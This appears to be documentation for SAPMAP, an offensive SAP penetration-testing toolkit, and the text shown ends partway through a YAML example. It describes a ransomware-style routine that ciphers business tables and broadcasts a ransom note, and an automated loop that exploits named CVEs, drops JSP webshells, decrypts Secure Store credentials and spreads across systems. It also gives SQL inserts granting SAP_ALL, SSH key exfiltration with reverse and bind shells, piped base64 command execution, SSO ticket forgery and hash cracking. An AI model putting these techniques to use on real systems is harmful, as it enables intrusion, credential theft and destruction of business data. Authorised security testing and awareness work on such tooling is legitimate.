SAPMAP tests RFC destinations using `/SDF/RFC_CHECK` with automatic fallback to `DEST_CHECK_CONNECTION` on older systems (NW < 7.40) where `/SDF/RFC_CHECK` doesn't exist. The fallback also provides remote system SID, client, and basis release.

---

## RanSAPware Awareness PoC

Demonstrates that an attacker with `RFC_ABAP_INSTALL_AND_RUN` access can render business-critical table data unreadable in seconds — a ransomware-style scenario for SAP.  Purely for authorized security-awareness demonstrations: the cipher is a simple modular rotation (not AES/RSA), and the decryption key stays in the local manifest file on the operator's machine.

### How It Works

1. **Pick a table** — Select from a curated list of high-impact tables (customer master, vendor master, sales orders, HR data, materials, finance) or enter any custom table name
2. **Field discovery** — SAPMAP calls `DDIF_FIELDINFO_GET` to enumerate all character-type fields (CHAR, NUMC, DATS, TIMS, CLNT, LANG, CUKY, UNIT, SSTR), filtering out structures, table types, and reference types
3. **Business impact preview** — Sample rows are shown before encryption so the operator sees exactly what data will be affected
4. **Encrypt** — A dynamically generated ABAP program runs via `RFC_ABAP_INSTALL_AND_RUN`:
   - `SELECT ... INTO CORRESPONDING FIELDS OF TABLE @lt_data` reads all eligible rows (up to configurable max, default 5000)
   - Each character field is rotated byte-by-byte using a random 16-character key within the printable ASCII range (0x20–0x7E, 95 characters)
   - `UPDATE <table> SET ... WHERE ...` writes the ciphered values back
5. **Ransom note** — An optional `TH_POPUP` broadcast sends a message to all logged-in SAP users
6. **Manifest** — A JSON manifest is saved to `loot/<SID>/` containing the table name, encrypted fields, key, row count, and timestamp

### Cipher

Per-byte modular rotation within printable ASCII:

```
encrypt: ciphertext[i] = ((plaintext[i] - 0x20 + key[i % keylen]) MOD 95) + 0x20
decrypt: plaintext[i]  = ((ciphertext[i] - 0x20 - key[i % keylen] + 95*256) MOD 95) + 0x20
```

The cipher is length-preserving (no field overflow), stays within the printable range (no binary corruption), and is fully reversible given the key.  Non-ASCII characters are passed through untouched.

### Decryption & Recovery

- **Normal decrypt** — Select a manifest from the decrypt modal, click Decrypt.  The same ABAP program runs with the reverse rotation
- **Undo erroneous decrypt** — If a table was accidentally decrypted twice (garbling the data), the "Undo decrypt (re-encrypt with this key)" button re-applies the encryption with the manifest's key to reverse the damage
- **Delete stale manifest** — Manifests from failed runs (0 rows encrypted, or test runs) can be deleted directly from the UI

### Double-Operation Prevention

- **Encrypt guard** — The backend checks for any active (non-decrypted) manifest on the same table before allowing a new encryption.  The frontend disables the Encrypt button when an active manifest exists
- **Decrypt guard** — A manifest that has already been decrypted cannot be decrypted again.  The UI shows its status as "Restored" with no Decrypt button

### GUI Access

**Right-click a pwned ABAP node → Exploitation → RanSAPware Awareness**

The modal provides:
- Table selector with suggested tables (category + description) and a custom table input
- Field list with select/deselect all, field type indicators, and row count
- Business impact preview table showing sample data
- Max rows slider (default 5000)
- TH_POPUP toggle for the ransom note broadcast
- Encrypt / Decrypt buttons with real-time status

### Implementation

- Backend: `modules/exploitation/sap_ransapware.py` (ABAP generation, cipher, manifest I/O)
- API: `POST /api/node/<sid>/ransapware/encrypt`, `POST /api/node/<sid>/ransapware/decrypt`, `GET /api/node/<sid>/ransapware/manifests`, `POST /api/node/<sid>/ransapware/manifest/delete`
- UI: `modules/core/sapmap_html.py` — RanSAPware modal in the right-click exploitation submenu

---

## AutoPwn — Full-Landscape Convergence Loop

**AutoPwn** automates the entire SAPMAP workflow: scan every node for exploitable CVEs, exploit each one with the right technique for its stack type, harvest credentials from Secure Stores, propagate to downstream systems with those credentials, and repeat until no new ground can be taken.  Launched once and runs hands-off until convergence.

### Launching

Right-click anywhere on the map background (or use the top **Actions** menu) and pick **⚡ AutoPwn**.  A config modal opens:

```
Vulnerability checks (exploitable):
  ☑ Gateway SAPXPG
  ☑ 10KBlaze (CVE-2020-6207)
  ☑ CVE-2025-31324 (VisualComposer RCE)
  ☑ CVE-2020-6287 (RECON)

Post-run detection (non-exploitable, reported only):
  ☑ CVE-2022-22536 (ICMAD)
  ☑ SAProuter Info Leak

Optional phases:
  ☐ OS Privilege Escalation (LPE)
  ☐ BTP / Cloud lateral movement

Max waves: [5 ▾]   (3 / 5 / 10 / 20)
```

Click **Start AutoPwn**.  A docked right-side progress panel appears with phase tracker, per-wave stats, and a live console.  Press **STOP** any time — stop checks fire inside scanner port-probe loops, not just between phases, so the run aborts within one timeout window (≤ 10 s).

### The Convergence Loop

Each wave runs six phases (the last two are optional):

```
WAVE N
├── Phase 1  Scan        — vulnerability checks on unpwned nodes
├── Phase 2  Exploit     — turn vulnerabilities into SAPMAP00 users
├── Phase 3  Enrich      — RFC destinations + ABAP/Java Secure Store
├── Phase 4  Propagate   — use harvested creds to pwn downstream
├── Phase 3b Enrich      — same enrichment for propagation-pwned nodes
├── Phase 5  BTP         — (optional) cloud lateral movement
└── Phase 6  LPE         — (optional) escalate to OS root
```

The wave loop exits early when a full wave produces zero new pwned nodes.

### Phase 1 — Scan (stack-aware short-circuit)

Vulnerabilities are checked in **exploitation priority order** so the most reliable exploit fires first:

| Priority | Vuln | Eligible nodes | Action when found |
|----------|------|----------------|--------------------|
| 1 | Gateway SAPXPG | ABAP / Java (not HANA-only) | Short-circuit on ABAP (instant exploit available).  On Java, **keep scanning** — GW-Java path is slow (~40 RFC chunks), better options may exist |
| 2 | CVE-2025-31324 | Java HTTP open | Short-circuit if found |
| 3 | CVE-2020-6287 RECON | Java HTTP open | Short-circuit if found |
| 4 | 10KBlaze (MS betrusted) | ABAP with MS internal port | No short-circuit (multi-hop, kept as last-resort) |

HANA-only nodes skip the gateway scan entirely — they have no ABAP dispatcher behind the GW, so the SQL-INSERT exploit can't work.

### Phase 2 — Exploit (stack-aware priority)

Each vulnerable node is exploited with the technique that fits its stack:

**ABAP nodes** — Priority order: `GW SAPXPG → dpmon SAP* → 10KBlaze`
- GW SAPXPG creates `SAPMAP00` via direct SQL INSERT into `USR02 + UST04 + USRBF2`.  Instant, single GW conversation.
- **dpmon virtual SAP\*** (Priority 1b, kernel ≥ 790, ABAP only) — when GW SAPXPG is reachable but the SQL writer chain fails (e.g. unknown DB CLI, SCC4 client lock, DBCO routing edge cases), the dpmon path uses the same GW OS-exec primitive to activate the kernel's virtual super-user via `dpmon` (SAP Note 3303172), captures the one-time password from stdout, and uses it for a single-shot BAPI_USER_CREATE1.  DB-agnostic, kernel-blessed.  Audit-logged as Security Audit Log event EUP purpose 2.

**Java nodes** — Priority order: `CVE-2025-31324 → RECON → GW-Java`
- CVE-2025-31324 drops a JSP webshell via metadatauploader, then deploys the UME user-creation JSP next to it.
- RECON is a single unauthenticated SOAP POST to `CTCWebService` — cleanest signal, no JSP write needed.
- GW-Java uses `create_user_java(method="gw")` to deploy the UME JSP via SAPXPG chunked write (~40 RFC calls).  Slower than RECON, kept as fallback.

**Salvage path** — if the CVE-2025-31324 JSP shell drops successfully but `create_user_java` fails (typical cause: SAP Java UME `password.max_length` rejects the password as too long, or the target's UME policy refuses the user create), AutoPwn doesn't waste the live shell.  It still:
- Extracts the Java Secure Store through the deployed shell
- Reads Java JCo/HTTP destinations through the deployed shell
- Imports any downstream credentials it finds — those go into the next wave's propagation phase

### Phase 3 — Enrich

For every newly-pwned node, AutoPwn runs the same pipeline the GUI's manual "Retrieve RFC Destinations" handler uses:

1. Retrieve destinations (SM59 + RFCDES + RFCATTRIB)
2. Self-detect destinations (loopback / `NONE` / matching SID → mark as self-edge)
3. SID-map (resolve `target_host:target_sysnr` to an existing node, auto-plot if unknown)
4. Add each connection through `state.add_connection()` (dedupe + emit Finding)
5. Ping non-self destinations for liveness + remote SID confirmation
6. Auto-discover unknown targets — fire a standard scan against any host SAPMAP hasn't seen
7. Decrypt ABAP `RSECTAB` SecStore (RFC / DB / CTS / SMTP passwords)
8. Decrypt Java `SecStoreFS` if the node is Java/dual-stack — auto-plot every `SAPJSF_<sid>_<client>` downstream ABAP target and import its credentials

### Phase 4 — Propagate (two-pass design)

**Pass 1 — SecStore credential connections.** Iterates `state.connections` where the source is pwned, the target is not, and the connection carries `secstore_password + rfc_user + target_sid`.  For each, it calls `propagate_from_node()` with the destination name, which routes to the "fast path": skip the source entirely, log in to the TARGET directly with the harvested credential, BAPI_USER_CREATE1 a fresh `SAPMAP00`, mark the edge red on the map.  This is the **only path** that works for Java→ABAP movement — Java nodes have no ABAP RFC stack, so the legacy `propagate_all` (which uses RFC retrieval on the source) returns nothing.

**Pass 2 — Generic ABAP propagation.** `propagate_all` retrieves RFC destinations from each pwned ABAP node and tries BAPI / SXPG / GW / betrusted in order.  Handles ABAP→ABAP via destinations that don't have a SecStore password (e.g. trust connections).

### Phase 3b — Re-enrichment after propagation

Nodes pwned during Phase 4 (e.g. `W74`, `S4H` reached via Java SecStore credentials on `SJJ`) get the **same full enrichment pipeline** as nodes pwned during Phase 2.  Without this step, propagated ABAP systems never have their RFC destinations read, so the next wave's lateral movement starves.

### Phase 5 — BTP (optional)

For each pwned ABAP node, `harvest_btp_credentials` mines OA2C_CONFIG, SM59 destinations, RSECTAB, and Java SecStoreFS for `(client_id, client_secret, uaa_url)` tuples.  Each candidate is exchanged for an access token at XSUAA's `/oauth/token`, then used to enumerate the cloud subaccount.  Synthetic BTP→on-prem RFC edges appear on the map as cloud→on-prem trust paths.

### Phase 6 — LPE (optional)

For each pwned ABAP node, tries registered LPE methods in priority order: BAPI profile assignment → WebGUI RSBDCOS0 SQL → CVE-2026-31431 "Copy Fail" root LPE on Linux.

### Post-Run Detection Pass

After convergence, AutoPwn runs a non-exploit detection sweep:

- **CVE-2022-22536 (ICMAD)** — HTTP request-smuggling probe against ICM ports; reports as Finding but doesn't exploit (smuggle payload depends heavily on cache state and frontend topology).
- **SAProuter Info Leak** — `NI_INFO` query against `/H/<router>` nodes to leak `saprouttab` lines.

These are detection-only (no accounts created, no exploitation) — kept out of the convergence loop because they're noisy and don't yield credentials.

### Stop Safety

`sapmap_stop.is_stop_requested()` is checked at every level:
- Between waves
- Between phases
- Between nodes within a phase
- **Inside scanner internal loops** — `check_ms_betrusted`, `check_cve_2025_31324`, `check_cve_2020_6287` each iterate over candidate instances / HTTP ports with 8–10s blocking probes per attempt.  The stop flag is polled at the top of every iteration, so STOP aborts within one timeout (≤ 10 s) instead of waiting for the entire N-iteration sweep to finish.

### Worked Example — SJJ (Java) → W74, S4H (ABAP)

```
Wave 1
  Phase 1   SJJ: GW vulnerable (no short-circuit on Java)
            SJJ: CVE-2025-31324 vulnerable → short-circuit
  Phase 2   SJJ: CVE-2025-31324 → JSP webshell dropped
            SJJ: create_user_java → SAPMAP00 created → pwned
  Phase 3   SJJ: Java SecStore extracted (24 entries)
            SJJ:   import SAPJSF_W74_001 cred (user=sapadm)
            SJJ:   import SAPJSF_S4H_001 cred (user=joris)
            SJJ:   auto-plot W74 (ABAP), S4H (ABAP)
            SJJ:   add edges SJJ→W74, SJJ→S4H with secstore_password
  Phase 4   Pass 1: 2 SecStore connections to unpwned targets
            SJJ→W74: BAPI_USER_CREATE1 with sapadm — SAPMAP00 created on W74
            SJJ→S4H: SAPMAP00 already exists with SAP_ALL — reused
            (both edges turn red on map)
  Phase 3b  W74: retrieve RFC destinations → discover BWP, CRM
            S4H: retrieve RFC destinations → discover ECC, GRC
            W74, S4H: extract ABAP RSECTAB → import more downstream creds

Wave 2
  Phase 1   BWP, CRM, ECC, GRC: scan for vulns
  Phase 2   …
  …

Convergence after wave N when no new pwns happen.
```

### Implementation

- Backend: `modules/exploitation/sapmap_autopwn.py` (`autopwn_run`, `phase1_scan` … `phase6_lpe`, `AutoPwnConfig`, `AutoPwnStatus`)
- API: `POST /api/actions/autopwn` (config), `GET /api/actions/autopwn/status` (polled at 800 ms)
- UI: `modules/core/sapmap_html.py` — config modal `#autopwn-config-modal`, docked progress panel `.autopwn-panel`
- Tests: `tests/test_autopwn.py` (73 tests covering config, phase order, scan short-circuit rules, SecStore-pass-before-generic, connection coloring, re-enrichment after propagation, J75-style GW-on-Java fallback)

---

## Local Privilege Escalation

When you have SAP credentials that lack SAP_ALL, SAPMAP can attempt to escalate the user's privileges directly on the system. Right-click a system on the map and choose **"Try Local Privilege Escalation"**.

### How It Works

SAPMAP tries registered LPE methods in priority order until one succeeds:

| Priority | Method | Mechanism | Requirements |
|----------|--------|-----------|--------------|
| 10 | `bapi_profiles_assign` | Direct RFC call to `BAPI_USER_PROFILES_ASSIGN` | S_RFC authorization for the BAPI function group |
| 50 | `webgui_rsbdcos0` | Execute SQL via OS commands through WebGUI | WebGUI HTTP access + S_TCODE for SE38 + authorization for RSBDCOS0 |

### WebGUI RSBDCOS0 Method (Detail)

This method reverse-engineers the SAP WebGUI HTTP protocol to execute OS commands without S_RFC authorization. The WebGUI runs transactions in dialog mode on the application server, so only S_TCODE and object-level authorizations apply — **not S_RFC**.

**Protocol flow:**

1. Open `SE38` with program `RSBDCOS0` via URL parameter: `~transaction=*SE38 RS38M-PROGRAMM=RSBDCOS0;DYNP_OKCODE=strt`
2. Load the selection screen via initial POST roundtrip with XSRF token (`~SEC_SESSTOKEN`)
3. Execute OS commands via `state/ur` URL pattern with field values in the path

**SQL statements executed** (example for HANA, user `basis_user`, client `000`):

```sql
-- Assign SAP_ALL and SAP_NEW profiles
INSERT INTO UST04 (MANDT,BNAME,PROFILE) VALUES ('000','basis_user','SAP_ALL')
INSERT INTO UST04 (MANDT,BNAME,PROFILE) VALUES ('000','basis_user','SAP_NEW')
INSERT INTO USR04 (MANDT,BNAME,NRPRO,PROFS) VALUES ('000','basis_user','14','C SAP_ALL')

-- Authorization object entries (S_RFC, S_TCODE, S_USER_GRP, etc.)
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_ADMI_FCD','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_DATASET','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_DEVELOP','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_RFC','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_TABU_DIS','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_TCODE','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_USER_AUT','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_USER_GRP','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_USER_PRO','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_XMI_PROD','^&_SAP_ALL')
```

Each SQL statement is wrapped in the appropriate DB CLI command (hdbsql for HANA, sqlcli for MaxDB, sqlcmd for MSSQL, sqlplus for Oracle, db2 for DB2) and executed as an OS command via RSBDCOS0.

### Adding New LPE Methods

New methods can be added by defining a decorated function in `modules/postex/sapmap_lpe.py` — no GUI, API, or framework changes needed:

```python
@lpe_method("my_new_method", "Description shown in console output", priority=75)
def lpe_my_new_method(node: SAPNode, creds: Credentials) -> bool:
    # Your escalation logic here
    # Return True if SAP_ALL was successfully assigned
    return True
```

---

## SSH Lateral Movement

SAPMAP can pivot through SSH to reach systems beyond the SAP RFC trust graph. The three-phase flow (harvest → test → exploit) runs from the right-click Exploitation menu.

### Phase 1 — Key Harvest
Exfiltrates SSH private keys and `known_hosts` from each `~<sid>adm/.ssh/` directory on a compromised host. Keys are detected by **file content** (first 64 bytes checked for `PRIVATE KEY` header), not filename — catches non-standard names like `my_id`. Root-owned keys are filtered when running as sidadm; bare hostnames without dots are dropped from target lists.

### Phase 2 — Lateral Movement (Test Keys)
Tests every (key, user, target) combination discovered in Phase 1 via `ssh -o BatchMode=yes ... id`. On success the target node is marked **pwned** (red border + lightning bolt) and `ssh_access` metadata is stored on the node for Phase 3.

### Phase 3 — Exploitation via SSH
Nodes pwned via SSH gain three new capabilities in the Exploitation menu:
- **OS Console** — Execute arbitrary commands through the source node's SAPXPG → SSH chain.  Commands are base64-encoded on the source, piped through `echo B64|base64 -d|sh` on the remote
- **Reverse Shell** — Deliver a reverse-connect shell to the SSH-pwned target
- **Bind Shell** — Open a listening port on the target and connect to it

Shell payloads use a multi-interpreter wrapper that auto-detects `python3` → `python` → `perl` → `bash /dev/tcp` on the remote, supporting both modern and legacy Linux hosts.

---

## SOAP-RFC over HTTP (firewalled targets)

Modern SAP landscapes routinely firewall the dispatcher (sapdp&lt;NN&gt;, port 32NN) and the gateway (sapgw&lt;NN&gt;, port 33NN) so that only the ICM HTTP/HTTPS port is reachable from outside the secure zone — Type-H HTTP destinations on the source system then proxy RFC calls inside the firewall.  From the attacker's perspective this means pyrfc (which speaks raw CPIC to the gateway) sits there for 60-120s per call before failing.  SAPMAP's SOAP-RFC transport works around that by speaking SAP's SOAP-over-HTTP RFC bridge at `/sap/bc/soap/rfc` directly.

### How it kicks in

For every authenticated operation against an ABAP target SAPMAP:

1. **Resolves a SOAP-RFC route** — scans the state for any Type-G/H HTTP destination targeting that node which has been verified by Test Connection and carries a SecStore-decrypted password.  The destination's RFC user + password become the SOAP basic-auth credential; the target's ICM HTTP port is discovered by `_discover_sid_http` (TCP-sweep of common ICM ports 8000-8050 / 8400-8450 / 50000-50020 + parsing of `/sap/public/info`)
2. **TCP-probes the gateway port** — 2-second `socket.connect` to 33NN on the target's first instance
3. **Routes the call accordingly** — if the gateway is reachable, uses the existing pyrfc path; if not, dispatches to `SOAPRFCSession` instead.  No operator action required — the fallback is fully transparent to every existing call site

When the SOAP path is taken, the operator sees it: the OS Command Terminal labels each command with `[channel: soap_rfc, 234ms — soap-rfc via to_ABAP (gateway down)]`, retrieve-RFCs / create-user / cleanup all log `gateway down — using SOAP-RFC via &lt;destination&gt;`.

### What works over HTTP

| Capability | FM(s) | Notes |
|---|---|---|
| Credential verification | `RFC_PING` | Sets `conn.soap_rfc_verified` |
| User creation + SAP_ALL | `BAPI_USER_CREATE1` + `BAPI_USER_PROFILES_ASSIGN` + `BAPI_TRANSACTION_COMMIT` | Continues past "user already exists" (01/102) |
| User deletion (cleanup) | `BAPI_USER_DELETE` + `BAPI_TRANSACTION_COMMIT` | "Already gone" (01/124) treated as success |
| Profile / role enumeration | `BAPI_USER_GET_DETAIL` | Drives the SAP_ALL badge in the modal |
| System metadata | `RFC_GET_SYSTEM_INFO` | Populates OS / DB / Kernel / SAP Release in System Details |
| Table read | `RFC_READ_TABLE` | Generic — used for T000 (client roles), RFCDES (destinations), RFCTRUST (outbound trust), RFCSYSACL (inbound ACL) |
| Schema discovery | `RFC_READ_TABLE` with `NO_DATA=X` | Kernel-version resilient: requests only fields the target's RFCSYSACL/RFCTRUST schema actually has (kernel 742 strips RFCEQUSER/RFCUSER/RFCSAMEUSR — schema probe handles transparently) |
| RFC destination ping | `DEST_CHECK_CONNECTION` | Replaces the 60-90s pyrfc ping per destination during Retrieve RFCs |
| OS command execution | `SXPG_STEP_XPG_START` | Drives the OS Command Terminal, bind shells, reverse shells, all chunked-payload writes |
| ABAP install + run | `RFC_ABAP_INSTALL_AND_RUN` | Drives SecStore RSECTAB hex-dump, SSFS file read (`OPEN DATASET`), OA2C profile harvest.  120-180s HTTP timeout because the kernel compiles the program before executing |

### Measured wall-clock impact

Live verification against an HTTP-only kernel-742 target (W74) with 3340 firewalled:

| Operation | pyrfc (gateway down) | SOAP-RFC |
|---|---|---|
| Retrieve RFCs (RFCDES + RFCTRUST + RFCSYSACL + 7 destination pings) | ~10 minutes | **0.25 seconds** |
| Test Connection on a Type-3 destination | 60-90 seconds | **<200 ms** |
| Create Remote User (RFC_PING → CREATE → PROFILES_ASSIGN → COMMIT) | 60-120 s (then errored) | **~600 ms** |
| Cleanup (delete user) | 60 s | **86 ms** |
| OS Command (`whoami` via SXPG) | 60-90 s (then errored) | **~250 ms** |
| Bind shell delivery (9-chunk payload + final exec) | timed out | succeeded end-to-end |

### Auth modes

* **HTTP basic auth** (`SOAPRFCSession` in `modules/protocols/sap_soap_basic.py`) — primary path, used for SecStore-recovered destination credentials
* **MYSAPSSO2 cookie auth** (`SOAPRFCClient` in `modules/exploitation/sap_soap_rfc.py`) — ticket-forgery chain, used to call BAPIs as a forged SAP\* without knowing the password

Both share envelope builders + the `parse_response` parser in `modules/protocols/sap_soap_envelopes.py`.

### Wire-format notes

A handful of SAP kernel quirks that bit us live and have been baked in:

* The kernel only emits an output TABLE in the response if it was DECLARED as an empty placeholder in the request — every envelope builder declares `&lt;PROFILES/&gt;`, `&lt;WRITES/&gt;`, `&lt;LOG/&gt;`, `&lt;RETURN/&gt;` etc. as appropriate
* SOAP faults bury the actually-useful kernel message under `&lt;detail&gt;&lt;rfc:Error&gt;&lt;type&gt;` / `&lt;message&gt;` — `parse_response` flattens that into the error string so callers can substring-match (`"not permitted in this client"`, `"NOT_AUTHORIZED"`, etc.) without bespoke XML parsing
* `SXPG_STEP_XPG_START` requires `STDOUTCNTL=M` / `STDERRCNTL=M` to merge OS stdout+stderr into the LOG table — without them the kernel sends output to a /usr/sap log file the caller can't see
* `MXROW` on SXPG must be retried without it on older kernels (Basis 7.0x) that raise `RFC_INVALID_PARAMETER`; session method handles this fallback automatically
* `SOAPAction` header MUST be `""` (empty quoted string) — non-empty values trigger `invalid action` rejection on SAP's ICM

---

## MYSAPSSO2 Ticket Forgery

Forges a MYSAPSSO2 logon ticket signed by the target system's own `SAPSYS.pse`, enabling single-sign-on impersonation of any user (default SAP\*) across the system's STRUSTSSO2 trust subgraph.

1. **PSE extraction** — Reads `SAPSYS.pse` + `cred_v2` from the target's SECUDIR. Multi-instance directory probing expands each known instance number to all SAP naming patterns (D/DVEBMGS/ASCS/SCS). Chunked binary read adapter works around SAPXPG's 128-byte TLV ceiling on kernel 793+ with automatic `python3` → `python` fallback for older hosts
2. **Key derivation** — Decrypts the PSE using PIN candidates (NULL-PIN, cred_v2-recovered, legacy defaults) and extracts the RSA/DSA signing key
3. **Ticket signing** — Generates a PKCS#7-signed MYSAPSSO2 cookie with configurable user, client, validity, and digest algorithm
4. **Artifact delivery** — Saves `.sap` GUI shortcut (correct instance number derived from SECUDIR path), `curl.sh`, `pyrfc.json`, and `ticket.b64` to the loot directory

---

## Propagation

Propagation is the core lateral movement capability. From a compromised system, SAPMAP:

1. **Retrieves RFC connections** — Runs RSRFCCHK to discover all Type 3 and TCP/IP destinations
2. **Tests each destination** — Validates logon success, SAP_ALL on the RFC user, and TCP/IP ping
3. **Creates users on targets** — Uses the best available method:
   - BAPI via RFC destination (if logon works and RFC user has SAP_ALL)
   - SXPG via TCP/IP destination (if remote command execution works)
   - Gateway exploit (if target gateway is vulnerable)
4. **Recurses** — Repeats from each newly compromised system

The map updates in real-time as new systems are reached, showing attack paths as colored connection lines.

---

## SAProuter Support

SAPMAP can reach SAP systems behind a SAP Router proxy. The SAProuter uses the NI (Network Interface) protocol to create TCP tunnels.

### Configuration

Set a SAProuter route string when adding a system manually, or right-click an existing system → Settings → Set SAProuter:

```
/H/<router_ip>/S/<router_port>/W/<password>
```

Example: `/H/3.221.134.53/S/3299/W/my_password`

### What Routes Through SAProuter

When a system has a SAProuter string configured, **all operations** route through it:

| Operation | Mechanism |
|-----------|-----------|
| RFC connections | NW RFC SDK native `saprouter` parameter |
| RFC System Info | `probe_sap_system()` via `connect_via_saprouter()` TCP tunnel |
| GW vulnerability check | `_gw_connect()` via SAProuter NI_ROUTE tunnel |
| GW exploit (user creation) | All P1→P2→P3→P4 packets via tunnel |
| Port scanning | `_scan_port()` via SAProuter tunnel |
| SecStore download | Both ABAP exec and SXPG fallbacks use RFC/SXPG which route through SAProuter |

### SAProuter Inheritance

When propagating from system A (with SAProuter) to system B (discovered via RFC connections), system B automatically inherits A's SAProuter string. This ensures newly discovered systems behind the router are also reachable.

---

## SAP Secure Store (RSECTAB) Decryption

SAPMAP can decrypt the SAP Secure Store to extract stored passwords for RFC destinations, database connections, CTS transport, and SMTP — enabling lateral movement via the extracted credentials.

### Decryption Chain

```
SSFS_SID.KEY ──[KEK + RSECCipher]──► SSFS master key (24 bytes)
SSFS_SID.DAT ──[RSECCipher + SSFS key]──► SECSTORE_DB/KEY record
Record[33:57] ──► RSECTAB individual key (24 bytes)
RSECTAB.DATA ──[standard 3DES + individual key]──► plaintext passwords
```

### Fallback Strategy

The SecStore download tries multiple methods in order:

1. **ABAP exec** (`RFC_ABAP_INSTALL_AND_RUN`) — reads SSFS files + RSECTAB with proper hex encoding
2. **SXPG file read** — reads SSFS KEY/DAT via `base64` (Linux) or `certutil` (Windows) OS commands
3. **SXPG database query** — reads RSECTAB via `hdbsql`/`sqlcli`/`sqlcmd`/`sqlplus`/`db2` CLI
4. **RFC_READ_TABLE** — last resort (unreliable for RAW fields)
5. **Client fallback** — discovers open clients via T000 CCCORACTIV, creates SAPMAP00 there, retries

### Entry Categories

Decrypted entries are categorised and colour-coded in the UI:

| Category | Pattern | Color |
|----------|---------|-------|
| RFC | `/RFC/S4D`, `/RFC/TMSADM@H2T.DOMAIN` | Orange |
| DB | `/DBCON/SYSTEMDB@H2T` | Blue |
| CTS | `/CTS/PWD/$T$/DOMAIN/DOMCTL` | Green |
| SMTP | `BC_SX_SMTP` | Purple |
| HMAC | `/HMAC_INDEP/...` | Grey |
| PSE | `/STRUST_PSE_PIN/...` | Grey |

---

## SAP Cloud Connector (SCC)

SAPMAP discovers, fingerprints, and exploits SAP Cloud Connector instances — the on-premise gateway that connects SAP BTP (cloud) to on-premise SAP systems. SCC nodes appear on the map as hexagonal boxes connected to their mapped on-premise backends.

### Discovery & Detection

SCC nodes are discovered automatically during network scans (port 8443/TCP). SAPMAP fingerprints the version, TLS cipher, and server banner unauthenticated, and matches against a CVE bucket table to flag known vulnerable builds.

### Right-Click Menu (SCC Node)

| Action | Description |
|--------|-------------|
| Set Credentials | Store SCC admin credentials (auto-fills all subsequent operations) |
| Probe Default Account | Try `Administrator / manage` — emits CRITICAL finding if live |
| Pull Mappings | Authenticated REST pull of all cloud→on-prem mappings; plots backends on map |
| Probe Mappings | TCP/HTTP smoke-test every mapping to confirm backend reachability |
| Extract Keystore + Decrypt SSFS | Full backup zip pull: tunnel certs, PP CA key, SSFS secrets (crown jewels) |
| Download Password Hashes | Read `users.xml`, parse Tomcat-format hashes, show hashcat commands + crackstation.net link |
| Decrypt On-Host SSFS | (from co-located SAP node) Read raw SSFS_SCC.KEY/.DAT via OS-exec and decrypt |

### Cloud Connector Submenu (on co-located SAP/ABAP node)

When an SCC is detected on the same host IP as an ABAP/Java node, a **Cloud Connector** submenu appears on that SAP node's right-click menu, giving access to all SCC operations without switching nodes:

| Action | Description |
|--------|-------------|
| Set SCC Credentials | Store credentials for the co-located SCC |
| Probe Default Account | Try default creds on co-located SCC |
| Pull Mappings | Pull cloud→on-prem mappings via REST |
| Probe Mappings | Smoke-test all mappings |
| Extract Keystore + Decrypt SSFS | Full backup + SSFS extraction |
| Harvest SCC Password Hashes | Read `users.xml` from disk via OS-exec (no SCC creds needed) |
| Harvest SCC Files (post-RCE) | ARP sweep, SSH-key hunt, SSFS bundle exfil, HA peer discovery |
| Harvest SCC Mappings (OS-exec) | Read `backends.xml` directly from disk (no SCC admin creds needed) |
| Decrypt On-Host SSFS | Read raw SSFS files from disk and decrypt secrets |

### hashes.com API Integration

After downloading SCC password hashes, click **Lookup on hashes.com** in the hash modal to automatically look up hashes against online rainbow tables (SHA-1, SHA-256, PBKDF2). A cracked password is automatically stored as an SCC credential and the SCC node is marked as pwned (⚡).

Set your API key once via **Settings → Set hashes.com API Key** (stored in `settings.local.json`, gitignored, never pushed).

### High Availability (HA) Detection

SAPMAP detects SCC HA master/shadow pairs. Run **Extract Keystore** on either node — it reads `scc_config/scc_config.ini` from the backup zip (`<haRole>`, `<shadowHost>`, `<masterHost>`) and draws a dashed **violet line** between the paired nodes labeled `HA: MASTER ⇄ SHADOW`.

### Scripting SCC operations

All SCC operations are scriptable via the [Scripted Scenarios](#scripted-scenarios) engine. The `target` for SCC actions is the **SCC host IP** (e.g. `"192.168.2.167"`); for node-side harvest actions it is the **SAP SID** (e.g. `S4H`).

#### SCC Script Actions

| Action | Target | Parameters | Description |
|--------|--------|-----------|-------------|
| `scc_set_credentials` | SCC host | `username`, `password` | Store SCC admin credentials |
| `scc_probe_creds` | SCC host | *(none)* | Try default `Administrator/manage` |
| `scc_pull_mappings` | SCC host | `username`, `password` | Pull cloud→on-prem mappings via REST |
| `scc_probe_mappings` | SCC host | *(none)* | TCP/HTTP smoke-test all mappings |
| `scc_extract_keystore` | SCC host | `username`, `password`, `backup_password` | Full backup + SSFS extraction (**requires `--confirm`**) |
| `scc_download_hashes` | SCC host | *(none)* | Download SCC `users.xml` password hashes |
| `scc_lookup_hashes` | SCC host | `api_key` (optional) | Look up hashes via hashes.com API |
| `scc_decrypt_ssfs` | SCC host | *(none)* | Decrypt SSFS from backup zip |
| `harvest_scc` | SAP SID | *(none)* | Post-RCE SCC harvest from pwned SAP node (**requires `--confirm`**) |
| `harvest_scc_mappings` | SAP SID | *(none)* | Read SCC `backends.xml` from disk via OS-exec |
| `harvest_scc_ssfs` | SAP SID | *(none)* | Read on-host SSFS_SCC.KEY/.DAT and decrypt secrets |

#### Example: Full SCC Compromise Chain

```yaml
name: "SCC Full Compromise"
steps:
  # Store credentials so subsequent steps auto-fill
  - action: scc_set_credentials
    target: "192.168.2.167"
    username: Administrator
    password: "Manage1"

